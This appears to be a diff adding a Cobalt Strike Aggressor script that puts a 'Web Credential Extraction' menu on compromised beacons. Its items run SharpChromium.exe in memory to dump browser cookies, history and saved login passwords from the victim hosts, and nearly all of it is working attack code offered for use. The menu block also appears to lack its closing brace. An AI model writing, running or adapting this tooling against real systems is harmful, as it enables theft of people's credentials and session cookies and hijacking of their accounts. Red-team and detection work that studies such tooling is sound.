@@ -1,0 +1,67 @@
+###############################
+##
+## Web Credential Extraction
+##
+##############################
+menu "Extracting Web Credentials - T1503" {
+
+		item "Retrieve All Cookies/History/Logins"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpchromeall($bid);
+				}
+			}
+
+		item "List Browser Cookies"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpchromecookies($bid);
+				}
+			}
+
+		item "List User's History"{
+			local('$bid');
+				foreach $bid ($1){
+					sharphistory($bid);
+				}
+			}
+
+		item "List Login Passwords"{
+			local('$bid');
+				foreach $bid ($1){
+					sharplogins($bid);
+				}
+			}
+###############################
+##
+## Web Credential Extraction
+##
+##############################
+
+###Grab all the Things
+
+sub sharpchromeall{
+bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "all");
+}
+######End of all the things
+
+###Grab all the Cookies
+
+sub sharpchromecookies{
+bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "cookies");
+}
+######End of all the cookies
+
+###Grab History
+
+sub sharphistory{
+bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "history");
+}
+######End Cookie History Function
+
+
+###Grab Login Info
+sub sharplogins{
+bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "logins");
+}
+######End Login Enumeration Function
